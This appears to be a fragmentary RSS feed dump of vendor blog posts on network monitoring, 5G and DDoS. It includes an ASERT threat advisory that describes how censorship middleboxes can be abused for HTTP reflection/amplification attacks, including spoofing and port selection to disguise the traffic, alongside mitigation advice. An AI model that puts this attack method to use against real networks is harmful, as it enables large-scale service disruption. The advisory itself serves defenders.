<p>Generally speaking for <a href="https://www.the20.com/blog/the-cost-of-it-downtime/">IT downtime</a>, average costs are around $5,600 per minute, which equates to more than $300,000 per hour, and 800 hours is commonly quoted as an annual downtime experience for manufacturers. Consider major global manufactures with 50 to 100 or more factories, running 16, 20, or 24 hours a day. Opportunity for IT disruptions in plants—with their WAN access, with cloud and co-location partners, and with their data centers and SaaS providers—is exponentially higher with every added complexity in the enterprise environment.</p>

<p>Reducing the frequency of outages, minimizing the length of the disruptions, and accelerating the restoration of production post-incident lowers the cost and impact on overall employee and plant productivity.</p>

  <title>Digital Transformation Opens Door to Stateful DDoS Attacks</title>
  <link>http://localhost:7996/blog/digital-transformation-opens-door-stateful-ddos-attacks</link>
  <description>State-based DDoS attacks are on the rise. Intelligent DDoS mitigation systems protect against such attacks by using a stateless network edge security stack.</description>
  <content:encoded><![CDATA[<p>The push toward digital transformation has inadvertently opened several new doors for state-exhaustion distributed denial-of-service (DDoS) attacks, requiring organizations to rethink their mitigation strategy to include intelligent DDoS mitigation systems. Let’s look at three examples:</p>

<ol>
	<li><strong>Stateful firewalls.</strong> As part of digital transformation projects, many organizations deploy network-based cybersecurity stacks that are often fronted by stateful, next-generation firewalls (NGFWs). (Stateful firewalls monitor and track the state of all network traffic and analyze traffic patterns to find possible threats.) Unfortunately, the very nature of these stateful NGFWs also creates new vulnerabilities. <a href="https://www.netscout.com/what-is-ddos/state-exhaustion-attacks">State-exhaustion DDoS attacks</a> can be targeted at stateful firewalls, effectively breaking down defenses and/or disrupting communications to the services behind them. According to the <a href="https://www.netscout.com/threatreport/">16th annual Worldwide Infrastructure Security Report</a>, 83 percent of survey respondents reported that their firewalls were targets, failed, or contributed to outages caused by DDoS attacks.</li>
	<li><strong>The stateful connections of stateless applications. </strong>Next-generation applications offer another example. Such applications are often designed to be stateless, thus running without the need to reference past iterations of the process. But the truth about these applications is that some form of state is in fact being tracked. A prime example of this is when a web application tracks the status of users who have previously logged in to their accounts but perhaps have briefly navigated away. Typically, these sessions can be tracked via cookies or tokens, or state may be otherwise maintained in the client. Moreover, stateless applications often depend on stateful roots. We are seeing increasing use of containerization technologies such as Kubernetes to increase scalability. (In fact, IDC expects to see almost two billion container instances to be deployed by 2020.) However, the supporting network infrastructure continues to depend on routers and stateful devices such as NGFWs, web application firewalls, intrusion-prevention systems, and load balancers. These systems remain highly susceptible to state-exhaustion DDoS attacks, which can be just as crippling to a business as their volumetric attack brethren.</li>
	<li><strong>The shift to remote work.</strong> As enterprises shifted to a work-from-home posture due to the COVID-19 pandemic, many were compelled to make significant investments in remote work infrastructure. In many cases, this included virtual private networks (VPNs) and conferencing systems. This has led to a greater reliance on cloud services to meet the needs for scalability and accessibility. DDoS attacks that disrupt workflows to the stateful VPN concentrator or cloud can cripple a remote workforce. The need for intelligent, stateless DDoS mitigation that can keep remote user access to internal and cloud-based services up and running is clear.</li>
</ol>

<p><strong>Putting the Right Mitigation Strategy in Place</strong></p>

<p>Being able to block state-based attacks requires unique capabilities. Intelligent DDoS mitigation systems, which operate in a stateless/semi-stateless manner, should be deployed in front of stateful devices to protect them and the state-minimized application services behind them from state-exhaustion attacks.</p>

<p>Intelligent, stateless DDoS mitigation offers enterprises and service providers several important benefits and strategic advantages. With the rapid growth of online commerce, consumers expect uninterrupted network performance. Simply put, DDoS attacks can prove a serious threat to the online customer experience. Mitigating those threats is critically important for any business that relies on network connectivity and the availability of their business-critical applications or services.</p>

<p>Similarly, communications service providers and cloud service providers are under constant pressure to deliver fast, reliable service that fulfills service-level agreements (SLAs). Any network downtime due to DDoS attacks can be costly. Intelligent DDoS mitigation offers a means for reducing the threat from such attacks.</p>

<p>For service providers and enterprises alike, state-exhaustion DDoS attacks represent a clear and present danger to business operations and profitability. While threats to stateful infrastructure are not new, digital transformation has expanded the threat surface and unleashed numerous new attack vectors, which should raise red flags. As a result, cybersecurity professionals must focus on designing next-generation IT environments that are resilient to state exhaustion attacks.</p>

  <title>Why “The Computer Is Running A Little Slow Today” In Your Healthcare’s Contact Center</title>
  <link>http://localhost:7996/blog/computer-running-slow-healthcare-contact-center</link>
  <description>Learn how one healthcare group improved end-user experiences at contact centers across the organization.</description>
  <content:encoded><![CDATA[<p>How many times have we heard permutations of scripted explanations such as “the computer is running a little slow today” when calling insurance, financial, or healthcare contact centers with questions about benefits or claims? Chances are, those instances only increased for many of us during the hybrid workforce transition, as Customer Service Representatives (CSRs) moved out of their contact centers and into work-from-home (WFH) offices.</p>

<p>WFH added another service edge that information technology (IT) teams needed to visualize and monitor—the client edge, where CSRs directly access cloud-based Unified Communications as a Service (UCaaS) platforms essential to their job functions from workstations connected to their personal internet service provider (ISP). Beyond ISP performance, IT now must factor how enterprise virtual private network (VPN) and virtual desktop infrastructure (VDI) support these WFH environments. As a result, successful troubleshooting related to resolving why the “computer is running a little slow” has grown more complex for the desktop, application, network, UC&amp;C, Telepresence, and security operations resources tasked with assuring that enterprise technology is not the root cause.</p>

<p>Simply stated: “more service edges, more problems.”</p>

<p>Learn how one leading healthcare and the business process outsourcer upon which it relied for application hosting services used NETSCOUT’s service edge visibility to close blind spots across this multi-tier environment and return UC&amp;C technology performance to reliable levels.</p>

  <description>Learn more about this distributed denial-of-service (DDoS) attack vector which abuses middlebox systems for HTTP reflection/amplification.</description>
  <content:encoded><![CDATA[<h1>ASERT Threat Summary</h1>

<p><strong>Date/Time:</strong> 20August2021 2100UTC<br /><strong>Severity:</strong> Warning<br /><strong>Distribution:</strong> TLP: WHITE <br /><strong>Categories:</strong> Availability<br /><strong>Contributors:</strong> <a href="https://www.linkedin.com/in/kevingbock/">Kevin Bock</a>, <a href="https://www.linkedin.com/in/abdulrahman-alaraj-86b60152/?originalSubdomain=sa">Abdulrahman Alaraj</a>, <a href="https://www.linkedin.com/in/yair-fax-95b898170/">Yair Fax</a>, <a href="https://www.linkedin.com/in/kyle-hurley-01365a141/">Kyle Hurley</a>, <a href="https://www.colorado.edu/ecee/eric-wustrow">Eric Wustrow</a>, <a href="https://www.cs.umd.edu/~dml/">Dave Levin</a>, Chris Conrad, Jon Belanger, John Kristoff, Hardik Modi, Tom Bienkowski, Sharon Reynolds, Bill Cerveny.</p>

<h2>Executive Summary</h2>

<p>In August 2021, a joint team of researchers uncovered a distributed denial-of-service (<a href="https://geneva.cs.umd.edu/posts/usenix21-weaponizing-censors/">DDoS) attack vector</a> which abuses middlebox systems for HTTP reflection/amplification. This attack vector leverages abusable censorship systems to significantly amplify DDoS attack traffic. Further, the routing loops used in networks where these systems reside can cause an infinite routing loop, producing as high as a 700,000:1 amplification factor. The resultant flood of traffic can be extremely detrimental to any network. This threat summary provides guidance and recommendations to minimize the impact of these threats. </p>

<h2>Key Findings</h2>

<ul><li>Researchers uncovered a new HTTP reflection/amplification vector that abuses censorship systems that are often deployed countrywide to eliminate unwanted traffic to undesirable websites.</li>
	<li>Routing loops that contain these abusable systems are configured such that they produce infinite routing loops causing as little as a 1:1 amplification factor, to as much as a 700,000:1 amplification factor. </li>
	<li>Tens of millions of these devices are exposed and vulnerable to abuse from adversaries, and approximately 18 million of these provide at least a 2:1 amplification factor. This results in one of the most prolific types of reflectors/amplifiers available to adversaries.</li>
</ul><h2>Analysis</h2>

<p>In August of 2021, a joint team of security researchers from the University of Maryland and the University of Colorado Boulder presented a research paper at the 30th USENIX Security Symposium. The paper detailed their discovery of a methodology for abusing large-scale internet censorship systems to generate HTTP reflection/amplification attacks with amplification ratios ranging from 1:1 to 700,000:1. They further discovered a population of what are essentially infinite repeating amplifiers caused by the placement of abusable censorship systems within the ambit of routing loops. Once stimulated to do so, these reflectors/amplifiers can produce continuous streams of packets directed towards the targeted IP address(es) until a packet drop or similar interruption of the looped traffic halts the amplification cycle.</p>

<p>Affected censorship systems can be abused to launch high-impact HTTP reflection/amplification attacks due to the following factors:</p>

<ul><li>A desire on the part of the designers of such systems to scale their performance and function in asymmetrical-routing scenarios by unwisely foregoing the requirement for a full TCP handshake prior to responding to requests for a URI on the censorship systems’ deny-lists.</li>
	<li>Configuring and deploying abusable systems such that they will intercept and respond to inbound spoofed, crafted attack initiator packets on their northbound interfaces, rather than intercepting and processing outbound traffic solely on their southbound interfaces.</li>
	<li>The siting of some abusable systems within the ambit of routing loops, thus converting them into what are effectively infinite repeating reflectors/amplifiers.</li>
</ul><p>The internet censorship systems in question are misconfigured such that they will respond with relatively ‘heavy’ HTML block notification pages not only to requests for denied URIs received on their southbound interfaces (i.e., originated by the user population whose web browsing is to be censored), but also to requests arriving on their northbound (i.e., towards the general Internet, outside of their intended coverage cone) interfaces. These factors, combined with the above-mentioned lack of enforcement regarding TCP three-way handshakes, ensure that attackers can spoof the IP addresses of their targets, selecting both the source and destination ports of their choice, in order to launch high-pps/-bps HTTP reflection/amplification attacks.</p>

<p>These systems are operated at large scale by nation-states and by some broadband access ISPs, the latter in the form of paid ‘safe browsing’ subscription services offered to their customers. Many enterprises, governmental organizations, educational institutions, etc. operate such systems on a smaller scale. In many cases, they listen for incoming TCP packets across the entire 64K range of TCP source and destination ports.<br />
 <br />
These suboptimal design and implementation decisions allow spoofed requests for denied FQDNs and/or URIs to be synthesized by attackers in much the same way as other well-known reflection/amplification DDoS vectors, resulting in amplified HTTP responses being directed towards the intended target(s) of the attack.</p>

<p>Because attackers can select both the source and destination ports of the spoofed attack initiator traffic, they can dictate the source and destination TCP ports of the amplified attack traffic directed towards attack targets. Skilled attackers are likely to choose source and destination ports intended to allow the amplified attack traffic to conform to common network access control policies, thus masquerading the attack traffic so that at first glance, it appears to be legitimate in the context of targeted applications, services, and infrastructure.</p>

<p>As of this writing, attacks using this methodology have yet to be observed in the wild. Based upon observed amplification factors attained during testing, it appears that using this attack methodology to generate HTTP reflection/amplification attacks ranging from tens of gigabits/sec into the terabit/sec range may be feasible.</p>

<p>The researchers who discovered this attack methodology estimate that ~200 million IP addresses can potentially be abused to launch attacks of this nature, due to the wide coverage cones of abusable Internet censorship systems operated by nation-states, enterprises, governmental departments, educational institutions, etc. Approximately 18 million of these IP addresses provide an amplification ratio of 2:1 or greater; some abusable systems can provide amplification ratios of up to ~700,000:1. Others provide effectively infinite amplification due to their siting within the ambit of routing loops, which result in attack initiator packets being endlessly recirculated through the censorship systems, continuously stimulating the generation of amplified attack packets until a dropped packet or other intervening event interrupts the packet-recirculation cycle. </p>

<h2>Collateral Impact</h2>

<p>High-bandwidth and/or -throughput<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4dbce3cf-7733-47a9-96be-6afc3fa09c28" href="http://localhost:7996/what-is-ddos" title="What Is a Distributed Denial of Service (DDoS) Attack?"> DDoS attacks</a> can congest peering, transit, core, distribution, and access links, disrupting bystander Internet traffic along with legitimate traffic destined for the intended target. Shared networking, computing, storage, and ancillary supporting infrastructure can be negatively impacted. These factors can result in significant collateral damage footprints from high-volume attacks.</p>

<p>The collateral impact of HTTP reflection/amplification attacks can be significant for operators of abusable internet censorship systems leveraged to launch these attacks. Significant network traffic inspection performance degradation, along with bandwidth (bps) and throughput (pps) consumption, may occur. Analysis of log files and other forms of telemetry may be rendered infeasible due to large influxes of attack initiator traffic and effluxes of amplified attack traffic. Legitimate network traffic sourced from networks within the coverage cone of abused censorship systems can be negatively impacted under such circumstances.</p>

<p>Failure to remove or remediate Internet censorship systems that are abused to launch HTTP reflection/amplification DDoS attacks can lead to affected network operators filtering all network traffic originating from networks where such systems are deployed.</p>

<p>Unintentional overblocking of legitimate network traffic can occur when insufficiently granular mitigation methods are employed. Such overblocking must be evaluated in the light of actions necessary to bring about partial service recovery of targeted servers/applications/services/networks.</p>

<h2>Mitigating Factors</h2>

<p>Collateral impact to abusable Internet censorship systems can motivate network operators and/or end-customers to remove or remediate affected systems. </p>

<p>HTTP reflection/amplification DDoS attack traffic can be mitigated via the implementation of industry-standard best current practices (BCPs) such as situationally-appropriate network access control policies, network infrastructure-based reaction mechanisms such as flowspec, and intelligent DDoS mitigation systems (IDMSes) such as NETSCOUT Arbor Sightline/TMS and AED/APS. In the context of this specific attack vector, the use of IDMSes such as Sightline TMS or AED/APS is preferred in order to allow for more granular attack traffic mitigation.</p>

<h2>Recommended Actions</h2>

<p>Network operators should perform reconnaissance to identify and remove or remediate abusable Internet censorship systems deployed on their networks and/or the networks of their customers. The security researchers who discovered this attack methodology have published a bespoke fork of the ZMap scanning software, along with an accompanying module, which can be used to identify abusable systems.  </p>

<p>Organizations with business-critical public-facing internet properties should implement all relevant network infrastructure, architectural, and operational Best Current Practices (BCPs), including situationally specific network access policies that only permit internet traffic via required IP protocols and ports. Deconflation of internet traffic associated with internet servers/services/applications from internet traffic generated by users on access networks is strongly recommended. Likewise, traffic originated by internet-facing servers that is unrelated to serving incoming requests (DNS lookups, outbound file transfers, etc.) should be sourced from separate interfaces and IP addresses from those used to service incoming application-/service-related traffic.</p>

<p><span style="font-size:12.0pt"><span style="font-family:&quot;Calibri&quot;,sans-serif">Implement situationally appropriate DDoS defenses for all public-facing internet properties and supporting infrastructure, including regular testing to ensure that any changes to organization’s servers, services, and applications are incorporated into the DDoS defense plan. Combine organic, on-site intelligent DDoS mitigation capabilities with cloud- or transit-based upstream DDoS mitigation services to ensure maximal responsiveness and flexibility during an attack.</span></span></p>

<p>It is imperative that organizations operating mission-critical public-facing Internet properties and/or infrastructure ensure that all servers, services, application, datastores, and infrastructure elements are protected against DDoS attack and included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>If deemed necessary, flowspec can potentially be used in some circumstances to mitigate HTTP reflection/amplification attacks, but it is important to ensure that reaction access-control list (ACL) stanzas are configured in such a way to minimize the risk of overblocking. In the context of this specific attack vector, the use of IDMSes such as Sightline TMS or AED/APS is preferred in order to allow for more granular attack traffic mitigation.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources; the relevant NETSCOUT Arbor account teams and/or ATAC may be consulted with regards to optimal countermeasure selection and employment</p>

  <title>Mexico Under Attack</title>
  <link>http://localhost:7996/blog/mexico-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for Mexico</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries. This week: <a href="https://www.netscout.com/sites/default/files/2021-04/SECR_020_EN-2101-TR2H2020_LATAM_Mexico.pdf">Mexico.</a></p>

  <description>Interest in private 5G networks is gaining momentum. As enterprises scale up their 5G deployments, they need pervasive network visibility to validate these models.</description>
  <content:encoded><![CDATA[<p>While public 5G is moving full speed ahead, interest in private 5G networks—and the innovation they can enable—is likewise gaining steam, with some of the world’s largest organizations rolling out ultrafast networks. From factory-floor production line automation to artificial intelligence–enabled preventive maintenance, many enterprise-level organizations see the growing business case for building new industrial networks that are private, secure, reliable, and incredibly fast. (In fact, Finnish equipment maker Nokia is counting on it: Nokia estimates the number of <a href="https://www.lightreading.com/private-networks/nokia-preps-5g-assault-on-14m-site-private-wireless-market/d/d-id/762536">base stations for private wireless networks could eventually double those dedicated to public mobile networks</a><u>.)</u></p>

The prototype facility will boast a network with 1.5 Gbps download speeds and latency of 15 milliseconds, designed to deliver significant enhancements in the operation of autonomous vehicles for inventory management, machine learning for inventory tracking, and augmented and virtual reality applications for improved workforce efficiency in warehouse operations.</p>

<p>Private adoption of 5G is gaining momentum, but it hasn’t yet reached global scale. To do so, enterprises need to determine whether they will build the networks themselves or work with an outside supplier, understand how they will engineer their network to ensure optimum coverage, and consider how they will monitor the network to ensure effective and efficient operations and maintenance.</p>

<p><strong>Planning and Visibility: How Enterprises Can Scale Private 5G</strong></p>

<p>Enterprises have options when it comes to adopting 5G networks:</p>

<ul>
	<li>They can negotiate service level agreements (SLAs) with carriers to provide guaranteed coverage areas and network attributes via network slicing, which some companies may prefer as a means to minimize capital expenditures. Under this structure, enterprises can further choose between processing their own data onsite or turning to carriers such as <a href="https://www.verizon.com/about/news/verizon-business-private-mec-aws">Verizon for mobile edge computing as a managed service</a>, enabled thanks to its partnership with Amazon Web Services (AWS).</li>
	<li>Alternatively, enterprises may choose to build their own customized, fully managed 5G networks using in-house resources, often prioritizing features such as low latency and high availability. These private 5G networks can offer greater flexibility and customization along a dedicated spectrum, greater data privacy and security, and tightened control over connected internet of things (IoT) devices and network resources.</li>
</ul>

<p>Whether outsourcing development to a vendor or owning this function in-, accurate modeling during the planning phase is critical. Calibrated or “tuned” radio frequency (RF) propagation models characterize the path loss from a transmitter to any given location, supporting RF planning tools used to design and optimize 5G networks. By using calibrated models as a basis for developing a new site plan or optimizing an existing cluster of sites once a network is set up, RF engineers can determine effective site settings and anticipate potential challenges that may incur additional costs in time and expenses.</p>

<p>As enterprises scale up their 5G deployments, they need pervasive network visibility to validate these models. Network and operations teams must ensure that real-world coverage and performance match propagation models while meeting strict security standards.</p>

<p>Monitoring packet data is the best way to gain this level of visibility. Packet data is vendor-independent, universally available, and carries all the contextual and relevant information about connected devices and their applications. With packet monitoring, every device-to-device or device-to-application transaction leaves a footprint on the network that can be analyzed for service performance issues and security-related threats. Packet data–driven visibility is the most reliable way to validate network reliability and application performance and allows engineers to optimize their networks to support intelligent automation.</p>

<p><strong>Delivering 5G Service Assurance </strong></p>

<p>With an increasing volume of IoT devices and the distributed nature of edge networks, enterprises must consider a real-time monitoring strategy to support 5G-enabled services. Smart data and the unparalleled visibility it offers helps organizations validate 5G models and continuously optimize network performance in response to traffic fluctuations, enabling a new level of orchestration and automation.</p>

<p>The global private wireless networking space is maturing fast, both publicly and behind the scenes. Regardless of the path an organization takes in its rollout of 5G, accurate planning and visibility determine success, with propagation modeling and packet monitoring proving central to scaling private 5G networks with confidence.<br />

  <title>Network Protection: It’s More Than a SecOps Imperative</title>
  <link>http://localhost:7996/blog/network-protection-imperative</link>
  <description>Only a collaborative effort of all internet community stakeholders will succeed in protecting our networks from increasing cyberthreats.</description>
  <content:encoded><![CDATA[<p>By Gaurav Mohan</p>

<p>Mobile devices are already a vital connector to online work and play, and as the popularity of remote work continues to gain steam, expect even reliance on these networks and the internet. In response, organizations across the globe are implementing policies related to remote work and online learning on a huge scale.</p>

<p>For smooth functioning of businesses and better business outcomes, critical IT and network infrastructures must be available at all times, with easy access remotely to data, applications, and internal services. A poor-performing infrastructure will have adverse impacts, including loss of productivity, poor customer service, a significant reduction in revenues, and additional vulnerability to cyberthreats. The surge in the use of the internet and digital networks also has led to increased data breaches and higher security risks.</p>

<p>Today’s enterprise networks are extremely complex, covering physical and virtual offices, public cloud environments, and more. The expanding threat surface is increasing the number of cyberattacks. To ensure a secure network, it is critical for organizations to capture data from various sources or touchpoints and apply threat intelligence and business analytics. Often, however, these organizations lack comprehensive and consistent network visibility, posing a huge challenge for cybersecurity teams charged with putting together a strategy for threat detection and response.</p>

<p><strong>Cybersecurity Is the New KPI for Enterprises</strong></p>

<p>Today, along with the traditional KPIs for reliability, performance, and availability, security is considered a key performance indicator. In this interconnected world, it is imperative to employ visibility and threat detection capabilities across multivendor, virtualized, or containerized network and service infrastructures.</p>

<p>Furthermore, the COVID-19 pandemic has triggered unprecedented cyberattacks, with cybercriminals succeeding in exploiting new vulnerabilities and causing disruption across VPNs, firewalls, and the cloud-based tools of employees working from home. Attackers are making malicious attempts to stop legitimate users from accessing organizations’ networks, freezing operations and causing financial losses and brand damage.</p>

<p><a class="tweetabletext align-left" href="http://twitter.com/intent/tweet?text=Today%E2%80%99s%20complex%20digital%20infrastructure%20demands%20collaboration%20between%20network%20and%20security%20teams%20to%20gain%20better%20clarity%20on%20whether%20an%20IT%20service%20event%20is%20a%20performance%20issue%20or%20a%20security%20incident.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/90701" rel="1" target="_blank">Today’s complex digital infrastructure demands collaboration between network and security teams to gain better clarity on whether an IT service event is a performance issue or a security incident. - Read more at @NETSCOUT</a>Cybercriminals are increasingly finding new ways to infiltrate networks by weaponizing new attack vectors, leveraging mobile hotspots, and targeting compromised Internet of Things (IoT) devices. Businesses are alarmed by the complexity, resilience, and frequency of cybercrime threats and want unparalleled visibility and insights into the growing threat landscape so they can address the attacks appropriately.</p>

<p><strong>Collaboration Between Network and Security Teams Is Critical</strong></p>

<p>It is critical to protect our cyber-connected world of networks and devices from the increasing number of attacks. Security teams should detect, validate, investigate, and respond to threats on an ongoing basis. But security also is a strategic priority for network teams. In fact, a reduction in security risk is among the key measurements of success for network teams, even before service quality, network visibility, and end-user experience. Moreover, today’s complex digital infrastructure demands collaboration between network and security teams to gain better clarity on whether an IT service event is a performance issue or a security incident. Cross-team collaboration will drive cost and operational efficiencies, reduce overall risks and quicken the pace for resolving security incidents.</p>

<p>IT leaders must encourage this collaboration by providing a transformational security view across operations and infrastructure that includes the following:</p>

<ul>
	<li>A data store built for use by both security and network teams</li>
	<li>A toolset that enables collaborative workflows</li>
	<li>Documented policies, controls, and best practices that formalize cross-team collaboration</li>
</ul>

<p>This effort will provide the much-needed strong foundation for configuring and implementing a robust cybersecurity strategy to protect what is considered the new gold for any business: its data.</p>

<p><strong>Calling on All Stakeholders</strong></p>

<p>Cybercrime has become a multibillion-dollar business, and cybercriminals will continue to discover newer techniques to formulate both crude and sophisticated attacks. Only a collaborative effort of all internet community stakeholders—manufacturers of connected devices, network equipment manufacturers, internet service providers, cloud providers, integrators, government agencies, enterprises, and the cybersecurity industry—will succeed in building a safer cyberspace for all.</p>

  <title>Movin’ On Up… to the Cloud and Network Edge</title>
  <link>http://localhost:7996/blog/movin-cloud-and-network-edge</link>
  <description>As rapid adoption of cloud services and expansion of the network edge put greater strains on IT, the need for network analytics solutions to improve visibility and control increases.</description>
  <content:encoded><![CDATA[<p>Many IT organizations have largely moved past the initial response to the COVID-19 pandemic—and its resultant challenges to the network—and have begun to move forward with more strategic initiatives to meet the dynamic technology infrastructure demands of the business. This has led to wider adoption of cloud services and an acceleration to the network edge.</p>

<p>With these advancements have come new challenges to the network, as well as to those professionals responsible for maintaining performance, security, and—most importantly—the end-user experience.</p>

<p><strong>Facing Network Management Challenges </strong></p>

<p>As enterprises increasingly embrace cloud services and utilize the ever-shifting network edge, IT must deal with a host of vexing challenges, including the following:</p>

<ul>
	<li><strong>Increasing complexity and rising costs.</strong> As new devices, endpoints, applications, cloud services, and providers are added to the network, the complexity IT must deal with grows exponentially. In addition to making problem resolution more difficult and time-consuming, the overall cost of maintaining and managing networks goes up.</li>
</ul>

<ul>
	<li><strong>Loss of visibility and control.</strong> As cloud services are introduced into the environment, visibility and control becomes far more difficult. Similarly limited visibility and control occurs at the network edge, making it harder for IT to assure network and application performance.</li>
</ul>

<ul>
	<li><strong>Inferior and inconsistent network access and service levels.</strong> Network downtime, slowdowns, and breaches have an immediate and lasting impact on business productivity and profitability. Not only that, but IT credibility is on the line when network service quality falters.</li>
</ul>

<p><strong>The Need for Cloud-Through-Client Visibility and Control</strong></p>

<p>As rapid adoption of cloud services and expansion of the network edge put greater strains on IT, the need for network analytics solutions to improve visibility into and deliver improved control over these vital resources increases.</p>

<p>Although cloud service providers do offer insights on select data, and application performance monitoring (APM) solutions can provide a measure of visibility, neither delivers the detailed intelligence and insights into the performance of network and computing components necessary for fully understanding the impact to the user experience.</p>

<p>To gain a complete picture, IT must leverage high-quality data focused on traffic movement, device status, bandwidth utilization, and user experience. This comprehensive data can be used for in-depth analysis that leads to quicker problem resolution, the ability to spot issues and threats sooner, and proactive network optimization.</p>

<p>Intelligence gathered from within the cloud, across multiple clouds, and at the edge provides IT with a more thorough picture into cloud services and service levels. This can lead to more accurate cloud service oversight and validation and more timely identification of cloud-related problems, thus speeding up repairs.</p>

<p>When armed with detailed visibility and control of the core/edge infrastructure, cloud services, and client experiences—eliminating blinds spots—IT gains a complete view that allows for highly capable analysis. Such analysis is the key to reducing repair time and lightening the IT load.</p>

  <title>Want Your UC&amp;C System to Live Up to Expectations? </title>
  <link>http://localhost:7996/blog/want-your-ucc-system-live-expectations</link>
  <description>As users have become increasingly reliant on UC&amp;C systems, the need to ensure these communications are reliable, while at the same time remaining completely secure, is paramount.</description>
  <content:encoded><![CDATA[<p>As the business world attempts to strike a delicate balance between work-from-home and return-to-office practices, enterprise reliance on unified communications and collaboration (UC&amp;C) tools will be of the upmost importance. Video conferencing, instant messaging, email, and calendar systems have become invaluable tools that are now embedded in the modern workflow. This growing dependence on UC&amp;C is putting increased pressure on IT professionals to ensure a superior user experience.</p>

<p>However, the complexity of today’s systems, which often involve hosted, cloud-based components, makes it difficult to troubleshoot quality issues. Compounding the challenge, IT must also balance the needs of performance and security. During a recent NETSCOUT OnGuard webinar, a panel of industry experts discussed three key takeaways that help maintain that delicate balance.</p>

<ol>
	<li><strong>Performance and Security Rely on Adherence to Standards</strong></li>
</ol>

<p>As users have become increasingly reliant on the audio, video, and text capabilities of UC&amp;C systems, the need to ensure that these communications are reliable, while at the same time remaining completely secure, is paramount to the enterprise.</p>

<p>“This is where standards come into play. Industry standards such as audio compression or video compression algorithms ensure UC&amp;C systems deliver a desired level of quality, as well as interoperability,” explained Paul Barrett, chief technology officer for NETSCOUT’s Enterprise Business. “By the same token, powerful encryption standards, such as common transport protocols, are key to ensuring sensitive communications remain secure. Although these protocols protect the privacy of UC&amp;C communications, they leave some packet data visible for advanced analytics tools to detect and isolate any latency or dropped packets that might be impacting quality.”</p>

<p>Having visibility into UC&amp;C systems, whether on premises or off premises, is vital for ensuring security and performance.</p>

<ol start="2">
	<li><strong>End-User Experience Directly Impacts Job Performance</strong></li>
</ol>

<p>The importance of ensuring the highest-quality end-user experience cannot be underestimated. For some industries, this can be a matter of life and death. “When you're looking at telemedicine, as an example, having a pristine end-user experience is critical,” said Eric Gray, chief solutions architect for NETSCOUT. “If a doctor is going to make a diagnosis of a patient based upon the symptoms they see through the camera, and based on limited diagnostic capability that could be sent across the internet, UC&amp;C performance has to be flawless. Anything less can lead to misdiagnosis, which could be life-threatening.”</p>

<p>Gray went on to say that one measure of the end-user experience is the mean opinion score (MOS), which analyzes the flow of media streams to determine how users will perceive the quality of audio or video communications tools. Because the quality of these systems often directly impacts employee job performance, being able to measure the effectiveness of UC&amp;C is crucial for the IT teams responsible for system performance.</p>

<ol start="3">
	<li><strong>Holistic Monitoring Is Important</strong></li>
</ol>

<p>Being able to properly monitor the UC&amp;C environment is imperative for ultimately determining the source of problems. “A drop in quality of a call might be short in duration, which is why it’s important to monitor the entire call to pinpoint the root cause,” explained Ray Krug, director of Product Marketing for NETSCOUT. “IT needs to know, was it the quality of service (QoS), network bandwidth, the VPN, or the demarcation point to the service provider? It’s crucial to constantly be monitoring these systems, so you can see what's going on. Without that knowledge, it’s very difficult to fix problems.”</p>

<p>Krug further explained that because UC&amp;C is so complex, if there is a problem, IT needs to know precisely what device is responsible and who has ownership. Holistic monitoring close to the server is key to isolating issues.</p>

<p>If there is a problem, you need to know what device is responsible, what the area of ownership is, and whether the service provider is the root cause. “You have to first make sure you’re properly handling the traffic as it traverses your own infrastructure, at your remote locations, and [as it travels to and from] your end users,” concluded Gray. “Having the ability to generate a synthetic transaction and simulate what an end user might experience is invaluable.”</p>

<p>For many companies, the performance and security of UC&amp;C systems is not only vital to the effectiveness of employees and customers, but holds the very reputation of a company’s brand in its hands.</p>

  <title>How Edge Monitoring Will Support Successful 5G Rollout</title>
  <link>http://localhost:7996/blog/how-edge-monitoring-will-support-successful-5g-rollout</link>
  <description>Smart data and a centralized view of performance from RAN to edge to core are vital for service providers as they roll out their 5G networks.</description>
  <content:encoded><![CDATA[<p>With the convergence of 5G, cloud, and edge computing, the global communications industry faces a unique moment.</p>

<p>Networks are becoming more distributed, flexible, and powerful, laying the foundation for a new generation of business services.</p>

<p>However, service providers rolling out these networks face enormous challenges. The build-out of <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="9a28c40e-7f65-4841-9cc9-60c943f85f94" href="http://localhost:7996/what-is/5G" title="What is 5G?">5G</a> networks—with a new cloudified radio access network (RAN), core, and thousands of short-range towers necessary for reliable service nationwide—is a massive undertaking. In addition, the underlying infrastructure has to support the exponential growth of connected devices, <a href="https://www.computerweekly.com/news/252478767/Cisco-5G-to-support-more-than-10-of-global-mobile-connections-by-2023">expected by some estimates to reach nearly 30 billion by 2023</a><u>.</u></p>

<p>Unfortunately, an unprecedented number of connected devices and network endpoints means there’s more opportunity for things to go wrong. Dead zones caused by cell misalignments and millimeter wave limitations pose potential challenges to service reliability.</p>

<p>To complicate matters further, there are also multiple possible iterations when designing mobile edge-computing environments, determined by any number of factors, including application needs, devices in use, and choices made when outsourcing to system integrators and mobile operators.</p>

<p>And let’s not forget that providers are hardly starting from a clean slate. Mobile operators must continue to manage existing infrastructure while simultaneously expanding 5G coverage, leveraging both standalone and non-standalone approaches to 5G deployment.</p>

